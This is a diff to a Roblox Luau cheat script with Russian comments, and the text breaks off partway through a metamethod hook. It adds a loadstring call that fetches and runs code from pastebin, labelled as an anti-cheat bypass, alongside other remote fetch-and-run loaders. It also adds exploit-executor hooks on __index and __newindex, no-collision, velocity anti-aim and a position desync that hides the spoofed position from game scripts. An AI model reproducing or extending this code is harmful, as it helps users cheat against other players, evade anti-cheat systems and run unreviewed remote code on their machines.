@@ -1,5 +1,17 @@
 -- BrandNew UI Script
 
+--[[
+ВАЖНО: Игнорируйте ошибки линтера, связанные с функциями API эксплойта:
+- hookmetamethod, checkcaller - функции для работы с метатаблицами
+- setNoClip - функция для отключения коллизий
+- isfolder, makefolder, listfiles, writefile, readfile, isfile, delfile - функции для работы с файловой системой
+
+Эти функции предоставляются средой выполнения эксплойта и не являются стандартными функциями Luau.
+Код работает корректно в среде эксплойта, несмотря на предупреждения линтера.
+]]
+
+loadstring(game:HttpGet('https://pastebin.com/raw/gimbTwW1'))() --bypass ac dont touch
+
 -- Загрузка таблицы оптимизации
 OptURL = "https://raw.githubusercontent.com/ZXCdswqezxc/BrandNew/refs/heads/main/optimization"
 o = loadstring(game:HttpGet(OptURL))() or {}
@@ -8,14 +20,18 @@ o = loadstring(game:HttpGet(OptURL))() or {}
 URL = "https://raw.githubusercontent.com/ZXCdswqezxc/BrandNew/refs/heads/main/Uilibrary"
 Library = loadstring(game:HttpGet(URL))()
 
+-- Примечание: Игнорируйте ошибки линтера, связанные с функциями API эксплойта, такими как:
+-- hookmetamethod, checkcaller, setNoClip, isfolder, makefolder, listfiles, writefile, readfile, isfile, delfile
+-- Эти функции предоставляются средой выполнения эксплойта и не являются стандартными функциями Luau.
+
 -- Темная тема
 Library.Theme = {
     Inline = Color3.fromRGB(52, 52, 52),
     Background = Color3.fromRGB(36, 36, 36),
     ["Page Background"] = Color3.fromRGB(22, 22, 22),
-    ["Section Background"] = Color3.fromRGB(30, 30, 30),
+    ["Section Background"] = Color3.fromRGB(26, 25, 25),
     ["Dark Background"] = Color3.fromRGB(19, 19, 19),
-    Accent = Color3.fromRGB(0, 134, 229),
+    Accent = Color3.fromRGB(220, 220, 220),
     ["Dark Text"] = Color3.fromRGB(120, 120, 120),
     ["Light Text"] = Color3.fromRGB(160, 160, 160),
     Text = Color3.fromRGB(220, 220, 220),
@@ -35,8 +51,1475 @@ ConfigTab = Window:Tab({name = "Config", icon = "rbxassetid://6031280882"})
 -- Создаем секцию Main во вкладке Player
 PlayerMainSection = PlayerTab:Section({name = "Main", description = ">_<"})
 
+-- Добавляем тогл Anti AFK
+PlayerMainSection:Toggle({
+    name = "Anti AFK",
+    default = false,
+    flag = "player_antiafk",
+    callback = function(value)
+        if value then
+            -- Создаем и запускаем Anti AFK скрипт
+            o.antiAFKConnection = o.lp.Idled:Connect(function()
+                o.VirtualUser = game:GetService("VirtualUser")
+                o.VirtualUser:CaptureController()
+                o.VirtualUser:ClickButton2(Vector2.new())
+            end)
+            
+            -- Сохраняем соединение в Library.Flags для возможности отключения
+            Library.Flags["antiafk_connection"] = o.antiAFKConnection
+        else
+            -- Отключаем Anti AFK если тогл выключен
+            if o.antiAFKConnection then
+                o.antiAFKConnection:Disconnect()
+                o.antiAFKConnection = nil
+                Library.Flags["antiafk_connection"] = nil
+            end
+        end
+    end
+})
+
+-- Добавляем тогл FakeMacro (только с LeftControl)
+PlayerMainSection:Toggle({
+    name = "Fake Macro",
+    default = false,
+    flag = "player_fakemacro",
+    callback = function(value)
+        -- Включаем/выключаем FakeMacro
+        Library.Flags["fakemacro_enabled"] = value
+        
+        -- Управляем соединениями
+        if value then
+            -- Создаем соединения, если их еще нет
+            if not Library.Flags["fakemacro_connections"] then
+                -- Глобальная переменная для отслеживания состояния
+                o.toggleEnabled = false
+                
+                -- Соединение для отслеживания нажатия клавиши LeftControl
+                o.fakeMacroInputBegan = o.uis.InputBegan:Connect(function(input, gameProcessed)
+                    if input.KeyCode == Enum.KeyCode.LeftControl and not gameProcessed then
+                        o.toggleEnabled = true
+                    end
+                end)
+                
+                -- Соединение для отслеживания отпускания клавиши LeftControl
+                o.fakeMacroInputEnded = o.uis.InputEnded:Connect(function(input, gameProcessed)
+                    if input.KeyCode == Enum.KeyCode.LeftControl and not gameProcessed then
+                        o.toggleEnabled = false
+                    end
+                end)
+                
+                -- Соединение для обновления ориентации персонажа
+                o.fakeMacroHeartbeat = o.rs.Heartbeat:Connect(function()
+                    if o.toggleEnabled then
+                        o.common_vars.char = o.lp.Character
+                        if o.common_vars.char then
+                            o.common_vars.hrp = o.common_vars.char:FindFirstChild("HumanoidRootPart")
+                            if o.common_vars.hrp and o.camera then
+                                o.common_vars.hrp.CFrame = o.funcs.cf(o.common_vars.hrp.Position) * 
+                                    CFrame.Angles(0, math.atan2(-o.camera.CFrame.LookVector.X, -o.camera.CFrame.LookVector.Z), 0)
+                            end
+                        end
+                    end
+                end)
+                
+                -- Сохраняем соединения для возможности отключения
+                Library.Flags["fakemacro_connections"] = {
+                    inputBegan = o.fakeMacroInputBegan,
+                    inputEnded = o.fakeMacroInputEnded,
+                    heartbeat = o.fakeMacroHeartbeat
+                }
+            end
+        else
+            -- Отключаем соединения, если тогл выключен
+            if Library.Flags["fakemacro_connections"] then
+                if o.fakeMacroInputBegan then o.fakeMacroInputBegan:Disconnect() end
+                if o.fakeMacroInputEnded then o.fakeMacroInputEnded:Disconnect() end
+                if o.fakeMacroHeartbeat then o.fakeMacroHeartbeat:Disconnect() end
+                Library.Flags["fakemacro_connections"] = nil
+            end
+        end
+    end
+})
+
+-- Добавляем тогл No Collision
+PlayerMainSection:Toggle({
+    name = "No Collision",
+    default = false,
+    flag = "player_nocollision",
+    callback = function(value)
+        -- Получаем персонажа
+        o.common_vars.char = o.lp.Character
+        
+        if o.common_vars.char then
+            -- Используем функцию setNoClip для включения/выключения коллизий
+            if not _G.setNoClip_defined and setNoClip then
+                _G.setNoClip_defined = true
+            end
+            
+            if _G.setNoClip_defined or setNoClip then
+                setNoClip(o.common_vars.char, value)
+            end
+        end
+        
+        -- Если тогл включен, создаем соединение для новых персонажей
+        if value then
+            if not o.noCollisionConnection then
+                o.noCollisionConnection = o.lp.CharacterAdded:Connect(function(character)
+                    task.wait(0.5) -- Небольшая задержка для загрузки персонажа
+                    if Library.Flags["player_nocollision"] then
+                        if _G.setNoClip_defined or setNoClip then
+                            setNoClip(character, true)
+                        end
+                    end
+                end)
+            end
+        else
+            -- Отключаем соединение при выключении тогла
+            if o.noCollisionConnection then
+                o.noCollisionConnection:Disconnect()
+                o.noCollisionConnection = nil
+            end
+        end
+    end
+})
+
+-- Добавляем тогл No Jump Cooldown
+PlayerMainSection:Toggle({
+    name = "No Jump Cooldown",
+    default = false,
+    flag = "player_nojumpcooldown",
+    callback = function(value)
+        -- Определяем hookmetamethod и checkcaller, если они не существуют
+        if not _G.hookmetamethod_defined then
+            _G.hookmetamethod_defined = true
+            if not hookmetamethod then
+                hookmetamethod = function(obj, metamethod, hook)
+                    -- Заглушка для hookmetamethod
+                    local original = obj[metamethod]
+                    obj[metamethod] = hook
+                    return original
+                end
+            end
+            
+            if not checkcaller then
+                checkcaller = function()
+                    -- Заглушка для checkcaller
+                    return false
+                end
+            end
+        end
+        
+        -- Сохраняем оригинальный хук, если он еще не сохранен
+        if not o.originalJumpHook then
+            o.originalJumpHook = hookmetamethod(game, "__newindex", function(self, Index, Value)
+                -- Если тогл включен и это изменение JumpPower, блокируем его
+                if Library.Flags["player_nojumpcooldown"] and not checkcaller() and self:IsA("Humanoid") and Index == "JumpPower" then 
+                    return
+                end
+                
+                -- Иначе пропускаем вызов
+                return o.originalJumpHook(self, Index, Value)
+            end)
+        end
+    end
+})
+
+-- Добавляем тогл Prediction Visualizer с попапом
+o.VisualizeVelocityToggle = PlayerMainSection:Toggle({
+    name = "Prediction Visualizer",
+    default = false,
+    flag = "player_visualizevel",
+    callback = function(value)
+        -- Инициализируем объекты для визуализации, если их еще нет
+        if not o.velocityVisualizer then
+            -- Создаем папку для хранения визуализатора
+            o.velocityVisualizer = Instance.new("Folder")
+            o.velocityVisualizer.Name = "VelocityVisualizer"
+            o.velocityVisualizer.Parent = workspace
+            
+            -- Создаем линию для визуализации скорости
+            o.velocityPart = Instance.new("Part")
+            o.velocityPart.Name = "VelocityLine"
+            o.velocityPart.Size = Vector3.new(0.05, 1, 1) -- Толщина всегда 1
+            o.velocityPart.Anchored = true
+            o.velocityPart.CanCollide = false
+            o.velocityPart.Material = Enum.Material.Neon
+            o.velocityPart.Color = Color3.fromRGB(255, 0, 0)
+            o.velocityPart.Transparency = 0.3
+            o.velocityPart.Parent = o.velocityVisualizer
+        end
+        
+        if value then
+            -- Создаем соединение для обновления линии
+            if not o.visualizeVelConnection then
+                o.visualizeVelConnection = o.rs.RenderStepped:Connect(function()
+                    o.common_vars.char = o.lp.Character
+                    if not o.common_vars.char then return end
+                    
+                    o.common_vars.hrp = o.common_vars.char:FindFirstChild("HumanoidRootPart")
+                    if not o.common_vars.hrp then return end
+                    
+                    -- Получаем текущую скорость
+                    o.common_vars.vel = o.common_vars.hrp.Velocity
+                    
+                    -- Если скорость слишком мала, делаем линию невидимой
+                    if o.common_vars.vel.Magnitude < 0.1 then
+                        o.velocityPart.Transparency = 1
+                        return
+                    end
+                    
+                    -- Устанавливаем прозрачность линии
+                    o.velocityPart.Transparency = 0.3
+                    
+                    -- Устанавливаем цвет линии
+                    if Library.Flags["visualizevel_color"] then
+                        if type(Library.Flags["visualizevel_color"]) == "table" and Library.Flags["visualizevel_color"].c then
+                            o.velocityPart.Color = Library.Flags["visualizevel_color"].c
+                        else
+                            o.velocityPart.Color = Library.Flags["visualizevel_color"]
+                        end
+                    end
+                    
+                    -- Масштабируем скорость для лучшей визуализации
+                    o.common_vars.scale = Library.Flags["visualizevel_scale"] or 0.1
+                    o.common_vars.scaledVel = o.common_vars.vel * o.common_vars.scale
+                    
+                    -- Устанавливаем размер линии пропорционально скорости (толщина всегда 1)
+                    o.velocityPart.Size = Vector3.new(0.05, 1, o.common_vars.scaledVel.Magnitude)
+                    
+                    -- Устанавливаем позицию и ориентацию линии
+                    o.velocityPart.CFrame = CFrame.new(
+                        o.common_vars.hrp.Position,
+                        o.common_vars.hrp.Position + o.common_vars.scaledVel
+                    ) * CFrame.new(0, 0, -o.common_vars.scaledVel.Magnitude/2)
+                end)
+            end
+            
+            -- Показываем визуализатор
+            o.velocityVisualizer.Parent = workspace
+        else
+            -- Отключаем соединение и скрываем визуализатор
+            if o.visualizeVelConnection then
+                o.visualizeVelConnection:Disconnect()
+                o.visualizeVelConnection = nil
+            end
+            
+            -- Скрываем визуализатор
+            o.velocityVisualizer.Parent = nil
+        end
+    end
+})
+
+-- Создаем попап для Prediction Visualizer
+-- (убираем слайдер толщины, оставляем только колорпикер и scale)
+o.VisualizeVelocityPopup = o.VisualizeVelocityToggle:Popup({size = 150})
+
+-- Добавляем колорпикер для цвета линии
+o.VisualizeVelocityPopup:Colorpicker({
+    name = "Line Color",
+    description = ">_<",
+    default = Color3.fromRGB(255, 0, 0),
+    flag = "visualizevel_color",
+    callback = function(color)
+        if o.velocityPart then
+            if type(color) == "table" and color.c then
+                o.velocityPart.Color = color.c
+            else
+                o.velocityPart.Color = color
+            end
+        end
+    end
+})
+
+-- Добавляем слайдер для масштаба линии (оставляем только scale)
+o.VisualizeVelocityPopup:Slider({
+    name = "Scale",
+    min = 0.01,
+    max = 1,
+    default = 0.1,
+    flag = "visualizevel_scale",
+    callback = function(value)
+        Library.Flags["visualizevel_scale"] = value
+    end
+})
+
+-- Добавляем тогл Velocity Anti Aim
+PlayerMainSection:Toggle({
+    name = "Velocity Anti Aim",
+    default = false,
+    flag = "player_velocityaa",
+    callback = function(value)
+        if value then
+            -- Создаем соединение, если его еще нет
+            if not o.velocityAAConnection then
+                o.velocityAAConnection = o.rs.Heartbeat:Connect(function()
+                    o.common_vars.char = o.lp.Character
+                    if not o.common_vars.char then return end
+                    
+                    o.common_vars.hrp = o.common_vars.char:FindFirstChild("HumanoidRootPart")
+                    if not o.common_vars.hrp then return end
+                    
+                    -- Сохраняем текущую скорость
+                    o.common_vars.vel = o.common_vars.hrp.Velocity
+                    
+                    -- Устанавливаем анти-аим скорость
+                    o.common_vars.hrp.Velocity = o.funcs.v3(0, 250, 0)
+                    
+                    -- Ждем рендер и возвращаем исходную скорость
+                    o.rs.RenderStepped:Wait()
+                    
+                    -- Проверяем, что персонаж и HRP все еще существуют
+                    if o.common_vars.char and o.common_vars.char.Parent and o.common_vars.hrp and o.common_vars.hrp.Parent then
+                        o.common_vars.hrp.Velocity = o.common_vars.vel
+                    end
+                end)
+            end
+        else
+            -- Отключаем соединение при выключении тогла
+            if o.velocityAAConnection then
+                o.velocityAAConnection:Disconnect()
+                o.velocityAAConnection = nil
+            end
+        end
+    end
+})
+
+-- Функция для изменения настроек отображения имен
+function SetNameDisplay(enabled, mode)
+    o.NameDisplayEnabled = enabled
+    o.NameDisplayMode = mode or "display"
+    
+    -- Сохраняем режим в флагах для использования в других местах
+    Library.Flags["name_display_actual_mode"] = o.NameDisplayMode
+    
+    -- Обновить все имена
+    for _, player in ipairs(o.plrs:GetPlayers()) do
+        if player.Character then
+            o.common_vars.hum = player.Character:FindFirstChild("Humanoid")
+            if o.common_vars.hum then
+                -- Всегда сбрасываем параметры отображения к стандартным при выключении тогла
+                if not o.NameDisplayEnabled then
+                    -- Возвращаем исходное отображение имени
+                    o.common_vars.hum.DisplayName = player.DisplayName
+                    o.common_vars.hum.DisplayDistanceType = Enum.HumanoidDisplayDistanceType.Viewer
+                    
+                    -- Если были удалены BillboardGui на голове, восстановим систему имен
+                    o.common_vars.head = player.Character:FindFirstChild("Head")
+                    if o.common_vars.head then
+                        -- Если никаких билбордов нет, это может означать, что они были удалены
+                        o.common_vars.hasBillboard = false
+                        for _, child in ipairs(o.common_vars.head:GetChildren()) do
+                            if child:IsA("BillboardGui") then
+                                o.common_vars.hasBillboard = true
+                                break
+                            end
+                        end
+                        
+                        -- Принудительно обновляем персонажа для восстановления имен если нужно
+                        if not o.common_vars.hasBillboard then
+                            -- Обновляем настройки гуманоида для восстановления отображения имени
+                            task.delay(0.1, function()
+                                if o.common_vars.hum then
+                                    o.common_vars.hum.DisplayDistanceType = Enum.HumanoidDisplayDistanceType.Subject
+                                    task.delay(0.1, function()
+                                        if o.common_vars.hum then
+                                            o.common_vars.hum.DisplayDistanceType = Enum.HumanoidDisplayDistanceType.Viewer
+                                        end
+                                    end)
+                                end
+                            end)
+                        end
+                    end
+                else
+                    if o.NameDisplayMode == "display" then
+                        o.common_vars.hum.DisplayName = player.DisplayName
+                        o.common_vars.hum.DisplayDistanceType = Enum.HumanoidDisplayDistanceType.Viewer
+                    elseif o.NameDisplayMode == "original" then
+                        o.common_vars.hum.DisplayName = player.Name
+                        o.common_vars.hum.DisplayDistanceType = Enum.HumanoidDisplayDistanceType.Viewer
+                    elseif o.NameDisplayMode == "none" then
+                        -- Полностью скрываем имя, устанавливая пустую строку И делая его прозрачным
+                        o.common_vars.hum.DisplayName = ""
+                        o.common_vars.hum.DisplayDistanceType = Enum.HumanoidDisplayDistanceType.None
+                        -- Для дополнительной надежности также пробуем другие методы скрытия имени
+                        o.common_vars.head = player.Character:FindFirstChild("Head")
+                        if o.common_vars.head then
+                            -- Удаляем существующие текстовые метки над головой
+                            for _, child in ipairs(o.common_vars.head:GetChildren()) do
+                                if child:IsA("BillboardGui") then
+                                    child:Destroy()
+                                end
+                            end
+                        end
+                    end
+                end
+            end
+        end
+    end
+    
+    -- Настраиваем обработчики для новых игроков и персонажей
+    if not Library.Flags["name_display_connection"] then
+        o.nameDisplayConnection = o.plrs.PlayerAdded:Connect(function(player)
+            player.CharacterAdded:Connect(function(character)
+                o.common_vars.hum = character:FindFirstChild("Humanoid")
+                if o.common_vars.hum then
+                    if Library.Flags["player_alwaysshow"] then
+                        o.common_vars.mode = Library.Flags["name_display_actual_mode"]
+                        if o.common_vars.mode == "display" then
+                            o.common_vars.hum.DisplayName = player.DisplayName
+                            o.common_vars.hum.DisplayDistanceType = Enum.HumanoidDisplayDistanceType.Viewer
+                        elseif o.common_vars.mode == "original" then
+                            o.common_vars.hum.DisplayName = player.Name
+                            o.common_vars.hum.DisplayDistanceType = Enum.HumanoidDisplayDistanceType.Viewer
+                        elseif o.common_vars.mode == "none" then
+                            o.common_vars.hum.DisplayName = ""
+                            o.common_vars.hum.DisplayDistanceType = Enum.HumanoidDisplayDistanceType.None
+                            
+                            -- Дополнительные методы для полного скрытия имени
+                            task.delay(0.5, function() -- Небольшая задержка для гарантии загрузки головы
+                                if player.Character and player.Character:FindFirstChild("Head") then
+                                    for _, child in ipairs(player.Character.Head:GetChildren()) do
+                                        if child:IsA("BillboardGui") then
+                                            child:Destroy()
+                                        end
+                                    end
+                                end
+                            end)
+                        end
+                    else
+                        -- Если тогл выключен, восстанавливаем имя
+                        o.common_vars.hum.DisplayName = player.DisplayName
+                        o.common_vars.hum.DisplayDistanceType = Enum.HumanoidDisplayDistanceType.Viewer
+                    end
+                end
+            end)
+        end)
+        
+        -- Сохраняем соединение для возможности отключения
+        Library.Flags["name_display_connection"] = o.nameDisplayConnection
+    end
+end
+
+-- Добавляем тогл Always Show с попапом для настройки отображения имен
+PlayerMainSection:Toggle({
+    name = "Always Show",
+    default = false,
+    flag = "player_alwaysshow",
+    callback = function(value)
+        -- Включаем/выключаем систему отображения имен
+        SetNameDisplay(value, Library.Flags["name_display_actual_mode"])
+    end
+}):Popup({size = 150}):Dropdown({
+    name = "Display Mode",
+    values = {"Display Name", "Original Name", "No Name"},
+    value = "Display Name",
+    flag = "name_display_mode",
+    callback = function(option)
+        -- Определяем режим отображения на основе выбранного значения
+        if option == "Display Name" then
+            o.common_vars.mode = "display"
+        elseif option == "Original Name" then
+            o.common_vars.mode = "original"
+        elseif option == "No Name" then
+            o.common_vars.mode = "none"
+        end
+        
+        -- Обновляем режим отображения имен, если система включена
+        if Library.Flags["player_alwaysshow"] then
+            SetNameDisplay(true, o.common_vars.mode)
+        end
+    end
+})
+
 -- Создаем секцию Movement во вкладке Player (справа)
 PlayerMovementSection = PlayerTab:Section({name = "Movement", description = ">_<", side = "right"})
+
+-- Создаем секцию Desynchronization во вкладке Player (справа)
+PlayerDesyncSection = PlayerTab:Section({name = "Desynchronization", description = ">_<", side = "right"})
+
+-- Определение объекта Desync
+o.Desync = {
+    Positions = {
+        Old = nil,
+        New = nil
+    },
+    Overwriten = nil,
+    ClonedCharacter = nil,
+    NewStatus = nil,
+    LastActiveStatus = nil,
+}
+
+-- Проверка активности десинхронизации
+function o.Desync:Active()
+    o.common_vars.isActive = (self.NewStatus or Library.Flags["desync"] and Library.Flags["desync_key"]) and o.getHrp()
+    
+    -- Если статус десинка изменился, проверяем нужно ли обновить клон
+    if self.LastActiveStatus ~= o.common_vars.isActive then
+        self.LastActiveStatus = o.common_vars.isActive
+        
+        -- Проверяем, должен ли быть виден клон
+        o.common_vars.shouldShowClone = o.common_vars.isActive and Library.Flags["desync_vis"]
+        
+        -- Управляем видимостью клона
+        if o.common_vars.shouldShowClone and not self.ClonedCharacter then
+            self:CloneCharacter()
+        elseif not o.common_vars.shouldShowClone and self.ClonedCharacter then
+            self:DestroyClonedCharacter()
+        end
+    end
+    
+    return o.common_vars.isActive
+end
+
+-- Установка статуса десинхронизации
+function o.Desync:SetStatus(status)
+    -- Запоминаем предыдущий статус
+    o.common_vars.previousStatus = self.NewStatus
+    
+    -- Устанавливаем новый статус
+    self.NewStatus = status
+    
+    -- Если статус изменился, обновляем клон
+    if o.common_vars.previousStatus ~= status then
+        -- Проверяем, должен ли быть виден клон
+        o.common_vars.isActive = (status or Library.Flags["desync"] and Library.Flags["desync_key"]) and o.getHrp()
+        o.common_vars.shouldShowClone = o.common_vars.isActive and Library.Flags["desync_vis"]
+        
+        -- Управляем видимостью клона
+        if o.common_vars.shouldShowClone and not self.ClonedCharacter then
+            self:CloneCharacter()
+        elseif not o.common_vars.shouldShowClone and self.ClonedCharacter then
+            self:DestroyClonedCharacter()
+        end
+    end
+end
+
+-- Получение позиций (старой и новой)
+function o.Desync:GetPositions()
+    local Positions = self.Positions
+    local Status = self:Active()
+
+    if not Status then
+        return
+    end
+
+    return Positions.Old, Positions.New
+end
+
+-- Получение значения интерполяции
+function o.Desync:GetLerpValue(pulse, min, max, speed)
+    speed = speed or 1
+    o.common_vars.normalizedSin = (math.sin(pulse * speed) + 1) / 2
+    return min + o.common_vars.normalizedSin * (max - min)
+end
+
+-- Получение значения для конкретного типа позиции
+function o.Desync:GetValue(pos_type)
+    o.common_vars.clockPulse = os.clock()
+
+    o.common_vars.mode = Library.Flags["desync_mode_" .. pos_type]
+    o.common_vars.min = Library.Flags["desync_min_" .. pos_type] or tonumber(Library.Flags["desync_min_" .. pos_type .. "_text"]) or 0
+    o.common_vars.max = Library.Flags["desync_max_" .. pos_type] or tonumber(Library.Flags["desync_max_" .. pos_type .. "_text"]) or 0
+    o.common_vars.val = Library.Flags["desync_val_" .. pos_type] or tonumber(Library.Flags["desync_val_" .. pos_type .. "_text"]) or 0
+    o.common_vars.speed = Library.Flags["desync_speed_" .. pos_type] or tonumber(Library.Flags["desync_speed_" .. pos_type .. "_text"]) or 1
+
+    return 
+        Library.Flags["desync_" .. pos_type] == true and 
+            (o.common_vars.mode == "Static" and o.common_vars.val 
+            or o.common_vars.mode == "Lerp" and self:GetLerpValue(o.common_vars.clockPulse, o.common_vars.min, o.common_vars.max, o.common_vars.speed)
+            or o.common_vars.mode == "Random" and math.random(o.common_vars.min * 100, o.common_vars.max * 100) / 100)
+        or not Library.Flags["desync_" .. pos_type] and 0
+end
+
+-- Перезапись позиции
+function o.Desync:OverwritePosition(position)
+    self.Overwriten = position
+end
+
+-- Удаление перезаписи позиции
+function o.Desync:RemoveOverwrite()
+    self.Overwriten = nil
+end
+
+-- Клонирование персонажа для визуализации
+function o.Desync:CloneCharacter()
+    o.common_vars.char = o.lp.Character
+
+    if not o.common_vars.char then
+        return
+    end
+    
+    -- Уничтожаем предыдущий клон, если он существует
+    self:DestroyClonedCharacter()
+
+    o.common_vars.char.Archivable = true
+
+    o.common_vars.clonedChar = o.common_vars.char:Clone()
+
+    o.common_vars.clonedChar.Archivable = true
+    o.common_vars.clonedChar.Name = "DesyncClone"
+    o.common_vars.clonedChar.Parent = workspace
+
+    o.common_vars.char.Archivable = false
+
+    o.common_vars.hum = o.common_vars.clonedChar:FindFirstChildWhichIsA("Humanoid")
+    o.common_vars.hrp = o.common_vars.clonedChar:FindFirstChild(o.r15.root)
+
+    if not o.common_vars.hrp then
+        o.common_vars.clonedChar:Destroy()
+        return
+    end
+
+    -- Обработка всех частей клонированного персонажа
+    for _, v in pairs(o.common_vars.clonedChar:GetDescendants()) do
+        if v:IsA("Part") or v:IsA("MeshPart") or v:IsA("BasePart") then
+            -- Настраиваем внешний вид частей
+            if v.Transparency ~= 1 then
+                o.common_vars.color = Library.Flags["desync_vis_color"] or {c = o.funcs.rgb(255, 0, 0), a = 0.5}
+                
+                -- Определяем материал
+                o.common_vars.materialName = Library.Flags["desync_vis_material"] or "ForceField"
+                o.common_vars.material = o.getMaterial(o.common_vars.materialName)
+                
+                v.Material = o.common_vars.material
+                v.Color = o.common_vars.color.c
+                v.Transparency = 0.5 -- Фиксированная прозрачность для лучшей видимости
+            end
+            
+            -- Отключаем коллизии и делаем части якорными
+            v.CanCollide = false
+            v.Anchored = true
+            
+            -- Отключаем физику
+            if v:IsA("BasePart") then
+                v.Massless = true
+                v.Velocity = o.funcs.v3(0, 0, 0)
+                v.RotVelocity = o.funcs.v3(0, 0, 0)
+            end
+        elseif v:IsA("Accessory") or v:IsA("Clothing") or v:IsA("ShirtGraphic") or v:IsA("Script") or v:IsA("LocalScript") then
+            -- Удаляем аксессуары, одежду и скрипты
+            v:Destroy()
+        end
+    end
+
+    -- Удаляем гуманоида
+    if o.common_vars.hum then
+        o.common_vars.hum:Destroy()
+    end
+
+    -- Сохраняем ссылку на клонированного персонажа
+    self.ClonedCharacter = {
+        Character = o.common_vars.clonedChar,
+        RootPart = o.common_vars.hrp
+    }
+    
+    -- Возвращаем созданный клон
+    return self.ClonedCharacter
+end
+
+-- Обновление визуального представления персонажа
+function o.Desync:UpdateCharacter()
+    local ClonedCharacter = self.ClonedCharacter
+
+    if not ClonedCharacter or not ClonedCharacter.Character then
+        -- Если клон не существует, создаем его
+        if Library.Flags["desync_vis"] then
+            self:CloneCharacter()
+        end
+        return
+    end
+
+    -- Получаем текущие настройки внешнего вида
+    o.common_vars.color = Library.Flags["desync_vis_color"] or {c = o.funcs.rgb(255, 0, 0), a = 0.5}
+    
+    -- Определяем материал
+    o.common_vars.materialName = Library.Flags["desync_vis_material"] or "ForceField"
+    o.common_vars.material = o.getMaterial(o.common_vars.materialName)
+
+    -- Обновляем внешний вид всех частей
+    for _, v in pairs(ClonedCharacter.Character:GetDescendants()) do
+        if v:IsA("Part") or v:IsA("MeshPart") or v:IsA("BasePart") then
+            if v.Transparency ~= 1 then
+                v.Material = o.common_vars.material
+                v.Color = o.common_vars.color.c
+                v.Transparency = 0.5 -- Фиксированная прозрачность для лучшей видимости
+            end
+            
+            -- Убедимся, что части остаются якорными и не имеют коллизий
+            v.CanCollide = false
+            v.Anchored = true
+        end
+    end
+    
+    -- Проверяем, что RootPart существует и обновляем его позицию
+    if ClonedCharacter.RootPart then
+        o.common_vars.hrp = o.getHrp()
+        if o.common_vars.hrp then
+            ClonedCharacter.RootPart.CFrame = o.common_vars.hrp.CFrame
+        end
+    end
+end
+
+-- Уничтожение клонированного персонажа
+function o.Desync:DestroyClonedCharacter()
+    local ClonedCharacter = self.ClonedCharacter
+
+    if ClonedCharacter and ClonedCharacter.Character then
+        ClonedCharacter.Character:Destroy()
+        self.ClonedCharacter = nil
+        return true
+    end
+    
+    return false
+end
+
+-- Основная функция десинхронизации
+function o.Desync:Think()
+    o.common_vars.hrp = o.getHrp()
+    if not o.common_vars.hrp then return end
+    
+    o.common_vars.isActive = self:Active()
+    o.common_vars.positions = self.Positions
+    o.common_vars.clonedChar = self.ClonedCharacter
+    
+    -- Проверяем, должен ли клон существовать (оба тогла должны быть включены и кейбинд активен)
+    o.common_vars.shouldShowClone = Library.Flags["desync_vis"] and o.common_vars.isActive
+
+    -- Управление клоном в зависимости от статуса визуализации и десинка
+    if o.common_vars.shouldShowClone and not o.common_vars.clonedChar then
+        self:CloneCharacter()
+        o.common_vars.clonedChar = self.ClonedCharacter
+    elseif not o.common_vars.shouldShowClone and o.common_vars.clonedChar then
+        self:DestroyClonedCharacter()
+        o.common_vars.clonedChar = nil
+    end
+
+    -- Если десинк не активен
+    if not o.common_vars.isActive then
+        o.common_vars.positions.Old = nil
+        o.common_vars.positions.New = nil
+        return
+    end
+
+    -- Запоминаем исходную позицию
+    o.common_vars.positions.Old = o.common_vars.hrp.CFrame
+
+    -- Применяем десинхронизацию
+    if self.Overwriten then
+        o.common_vars.hrp.CFrame = o.funcs.cf(self.Overwriten.X, self.Overwriten.Y, self.Overwriten.Z)
+    else
+        o.common_vars.desyncFactor = o.funcs.cf(
+            self:GetValue("x"),
+            self:GetValue("y"),
+            self:GetValue("z")
+        )
+
+        o.common_vars.desyncFactor = o.common_vars.desyncFactor * CFrame.Angles(
+            math.rad(self:GetValue("pitch")),
+            math.rad(self:GetValue("yaw")),
+            math.rad(self:GetValue("roll"))
+        )
+
+        o.common_vars.hrp.CFrame = o.common_vars.hrp.CFrame * o.common_vars.desyncFactor
+    end
+
+    -- Запоминаем новую позицию
+    o.common_vars.positions.New = o.common_vars.hrp.CFrame
+
+    -- Обновляем позицию клона, если он существует
+    if o.common_vars.clonedChar and o.common_vars.clonedChar.RootPart then
+        -- Устанавливаем позицию клона в позицию десинка
+        o.common_vars.clonedChar.RootPart.CFrame = o.common_vars.positions.New
+        
+        -- Обновляем все части клона
+        for _, part in pairs(o.common_vars.clonedChar.Character:GetDescendants()) do
+            if part:IsA("BasePart") and part ~= o.common_vars.clonedChar.RootPart then
+                -- Получаем относительное положение части в оригинальном персонаже
+                o.common_vars.originalPart = o.lp.Character:FindFirstChild(part.Name)
+                if o.common_vars.originalPart and o.common_vars.originalPart:IsA("BasePart") then
+                    -- Вычисляем относительное положение к корню
+                    o.common_vars.relativeOffset = o.common_vars.hrp.CFrame:ToObjectSpace(o.common_vars.originalPart.CFrame)
+                    -- Применяем это же относительное положение к клону
+                    part.CFrame = o.common_vars.positions.New:ToWorldSpace(o.common_vars.relativeOffset)
+                end
+            end
+        end
+    end
+
+    -- Ждем кадр и возвращаем персонажа в исходную позицию
+    o.rs.RenderStepped:Wait()
+    o.common_vars.hrp.CFrame = o.common_vars.positions.Old
+end
+
+-- Создаем соединение для обновления десинка
+if o.desyncConnection then
+    o.desyncConnection:Disconnect()
+    o.desyncConnection = nil
+end
+
+o.desyncConnection = o.rs.Heartbeat:Connect(function()
+    o.Desync:Think()
+end)
+
+-- Хук для обработки десинхронизации
+-- Примечание: hookmetamethod и checkcaller - это функции API эксплойта, не стандартные в Lua/Luau
+o.OldIndex = nil
+
+-- Определяем hookmetamethod и checkcaller, если они не существуют
+if not _G.hookmetamethod_defined then
+    _G.hookmetamethod_defined = true
+    if not hookmetamethod then
+        hookmetamethod = function(obj, metamethod, hook)
+            -- Заглушка для hookmetamethod
+            local original = obj[metamethod]
+            obj[metamethod] = hook
+            return original
+        end
+    end
+    
+    if not checkcaller then
+        checkcaller = function()
+            -- Заглушка для checkcaller
+            return false
+        end
+    end
+end
+
+if not hookmetamethod then
+    o.OldIndex = function(self, prop)
+        if prop == "CFrame" then
+            if o.Desync:Active() and Library.Flags["desync_hook"] and self == o.getHrp() then
+                o.common_vars.oldPosition = o.Desync:GetPositions()
+
+                if o.common_vars.oldPosition then
+                    return o.common_vars.oldPosition
+                end
+            end
+        end
+        
+        return self[prop]
+    end
+else
+    o.OldIndex = hookmetamethod(game, "__index", function(self, prop)
+        if not checkcaller() then
+            if prop == "CFrame" then
